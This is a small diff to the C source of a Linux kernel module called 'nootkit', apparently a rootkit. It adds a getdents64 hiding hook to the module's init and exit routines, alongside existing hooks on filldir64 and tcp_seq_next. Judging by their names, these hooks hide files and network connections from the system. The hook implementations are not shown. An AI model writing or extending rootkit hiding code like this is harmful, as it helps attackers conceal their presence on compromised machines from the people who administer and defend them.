@@ -45,6 +45,7 @@ int nootkit_init(void) {
         return -EFAULT;
     }
 
+    hide_hook_set_getdents64();
     hide_hook_set_filldir64();
     hide_hook_set_tcp_seq_next();
 
@@ -54,6 +55,7 @@ int nootkit_init(void) {
 void nootkit_exit(void) {
     hide_hook_unset_filldir64();
     hide_hook_unset_tcp_seq_next();
+    hide_hook_unset_getdents64();
 
     printk(KERN_INFO "Unloaded nootkit!\n");
 }
